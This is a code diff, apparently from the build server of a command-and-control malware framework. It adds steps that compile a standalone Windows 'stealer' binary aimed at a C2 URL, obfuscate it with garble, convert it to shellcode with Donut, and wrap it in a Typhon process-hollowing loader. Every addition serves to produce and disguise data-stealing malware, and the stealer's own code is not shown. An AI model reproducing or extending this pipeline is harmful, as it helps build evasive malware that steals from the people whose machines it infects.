@@ -1628,6 +1628,26 @@ func runBoundFiles() {
       sendToStream({ type: "output", text: "\n=== Standalone Stealer Binary ===\n", level: "info" });
       sendToStream({ type: "output", text: `C2 URL: ${config.serverUrl}\n`, level: "info" });
 
+      // Resolve Donut/Typhon for stealer if not already resolved by the main build
+      let stealerDonutBin = donutBin;
+      let stealerTyphonInfo = typhonInfo;
+      if (!stealerDonutBin) {
+        const d = await checkDonutAvailable(sendToStream);
+        if (d) {
+          stealerDonutBin = d;
+        } else {
+          sendToStream({ type: "output", text: "Donut not available — shellcode conversion skipped for stealer\n", level: "warn" });
+        }
+      }
+      if (!stealerTyphonInfo) {
+        const t = await checkTyphonAvailable(sendToStream);
+        if (t) {
+          stealerTyphonInfo = t;
+        } else {
+          sendToStream({ type: "output", text: "Typhon not available — process hollowing skipped for stealer\n", level: "warn" });
+        }
+      }
+
       const stealerEnv: NodeJS.ProcessEnv = {
         ...process.env,
         GOOS: "windows",
@@ -1646,18 +1666,33 @@ func runBoundFiles() {
         "-H=windowsgui",
       ].join(" ");
 
-      const stealerOutputName = deps.sanitizeOutputName("stealer-windows-amd64.exe");
-      const stealerArgs = [
+      const stealerPeName = deps.sanitizeOutputName("stealer-windows-amd64.exe");
+      const stealerPePath = `${outDir}/${stealerPeName}`;
+
+      const stealerBuildArgs = [
         "-trimpath",
         "-buildvcs=false",
         `-ldflags=${stealerLdflags}`,
-        "-o", `${outDir}/${stealerOutputName}`,
+        "-o", stealerPePath,
         "./cmd/stealer",
       ];
 
-      logger.info(`[build:${buildId.substring(0, 8)}] Building stealer: go build ${stealerArgs.join(" ")}`);
+      // Use garble if obfuscation is enabled — same flags as the main agent build
+      let stealerBuildCmd;
+      if (config.obfuscate) {
+        sendToStream({ type: "output", text: "Obfuscation enabled for stealer (garble)\n", level: "info" });
+        const garbleFlags: string[] = [];
+        if (config.garbleLiterals) { garbleFlags.push("-literals"); sendToStream({ type: "output", text: "Garble: obfuscate literals\n", level: "info" }); }
+        if (config.garbleTiny)     { garbleFlags.push("-tiny");     sendToStream({ type: "output", text: "Garble: tiny mode\n",           level: "info" }); }
+        if (config.garbleSeed)     { garbleFlags.push(`-seed=${config.garbleSeed}`); }
+        stealerBuildCmd = $`garble ${garbleFlags} build ${stealerBuildArgs}`;
+      } else {
+        stealerBuildCmd = $`go build ${stealerBuildArgs}`;
+      }
 
-      const stealerProc = $`go build ${stealerArgs}`.env(stealerEnv).cwd(clientDir).nothrow();
+      logger.info(`[build:${buildId.substring(0, 8)}] Building stealer: ${config.obfuscate ? "garble" : "go"} build ${stealerBuildArgs.join(" ")}`);
+
+      const stealerProc = stealerBuildCmd.env(stealerEnv).cwd(clientDir).nothrow();
       for await (const line of stealerProc.lines()) {
         const t = line.trim();
         if (t) sendToStream({ type: "output", text: line + "\n", level: "info" });
@@ -1669,15 +1704,82 @@ func runBoundFiles() {
         if (errText) sendToStream({ type: "output", text: errText + "\n", level: "error" });
         sendToStream({ type: "output", text: "WARNING: Stealer binary build failed — skipping\n", level: "warn" });
       } else {
-        const stealerSize = Bun.file(`${outDir}/${stealerOutputName}`).size;
-        sendToStream({ type: "output", text: `Stealer: ${stealerOutputName} (${stealerSize} bytes)\n`, level: "info" });
+        const stealerPeSize = Bun.file(stealerPePath).size;
+        sendToStream({ type: "output", text: `Stealer PE: ${stealerPeName} (${stealerPeSize} bytes)\n`, level: "info" });
         (build.files as any[]).push({
-          name: stealerOutputName,
-          filename: stealerOutputName,
+          name: stealerPeName,
+          filename: stealerPeName,
           platform: "windows-amd64",
           version: "stealer",
-          size: stealerSize,
+          size: stealerPeSize,
         });
+
+        // ── Donut: convert PE → position-independent shellcode ──────────────
+        let stealerShellcodePath: string | null = null;
+        if (stealerDonutBin) {
+          const stealerBinName = deps.sanitizeOutputName("stealer-windows-amd64.bin");
+          const stealerBinPath = `${outDir}/${stealerBinName}`;
+          sendToStream({ type: "output", text: `Converting stealer PE to shellcode with Donut...\n`, level: "info" });
+          try {
+            const donutResult = await $`${stealerDonutBin} -i ${stealerPePath} -o ${stealerBinPath} -a 2`.nothrow().quiet();
+            if (donutResult.exitCode !== 0) {
+              const errText = (donutResult.stderr.toString() || donutResult.stdout.toString()).trim();
+              sendToStream({ type: "output", text: `WARNING: Donut failed for stealer (exit ${donutResult.exitCode}): ${errText}\n`, level: "warn" });
+            } else {
+              const shellcodeSize = Bun.file(stealerBinPath).size;
+              if (shellcodeSize > 0) {
+                sendToStream({ type: "output", text: `Stealer shellcode: ${stealerBinName} (${shellcodeSize} bytes)\n`, level: "info" });
+                stealerShellcodePath = stealerBinPath;
+                (build.files as any[]).push({
+                  name: stealerBinName,
+                  filename: stealerBinName,
+                  platform: "windows-amd64",
+                  version: "stealer",
+                  size: shellcodeSize,
+                });
+              } else {
+                sendToStream({ type: "output", text: `WARNING: Donut shellcode output for stealer is empty\n`, level: "warn" });
+              }
+            }
+          } catch (donutErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Donut error for stealer: ${donutErr.message || donutErr}\n`, level: "warn" });
+          }
+        }
+
+        // ── Typhon: wrap shellcode (or PE) in a process-hollowing loader ────
+        if (stealerTyphonInfo) {
+          const typhonInput = stealerShellcodePath || stealerPePath;
+          const stealerTyphonName = deps.sanitizeOutputName("stealer-windows-amd64-typhon.exe");
+          const stealerTyphonPath = `${outDir}/${stealerTyphonName}`;
+          sendToStream({ type: "output", text: `Wrapping stealer in Typhon process-hollowing loader...\n`, level: "info" });
+
+          const typhonArgs: string[] = ["-build", typhonInput, "-o", stealerTyphonPath];
+          if (config.typhonVariant) typhonArgs.push("-variant", config.typhonVariant);
+          if (config.typhonProcess) typhonArgs.push("-process", config.typhonProcess);
+
+          try {
+            const typhonResult = stealerTyphonInfo.useWine
+              ? await $`wine ${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet()
+              : await $`${stealerTyphonInfo.bin} ${typhonArgs}`.nothrow().quiet();
+
+            if (typhonResult.exitCode !== 0) {
+              const errText = (typhonResult.stderr.toString() || typhonResult.stdout.toString()).trim();
+              sendToStream({ type: "output", text: `WARNING: Typhon failed for stealer (exit ${typhonResult.exitCode}): ${errText}\n`, level: "warn" });
+            } else {
+              const typhonSize = Bun.file(stealerTyphonPath).size;
+              sendToStream({ type: "output", text: `Stealer Typhon loader: ${stealerTyphonName} (${typhonSize} bytes)\n`, level: "info" });
+              (build.files as any[]).push({
+                name: stealerTyphonName,
+                filename: stealerTyphonName,
+                platform: "windows-amd64",
+                version: "stealer",
+                size: typhonSize,
+              });
+            }
+          } catch (typhonErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Typhon error for stealer: ${typhonErr.message || typhonErr}\n`, level: "warn" });
+          }
+        }
       }
     } else if (config.enableStealer) {
       sendToStream({ type: "output", text: "WARNING: Stealer binary requires a server URL and agent token — skipping\n", level: "warn" });
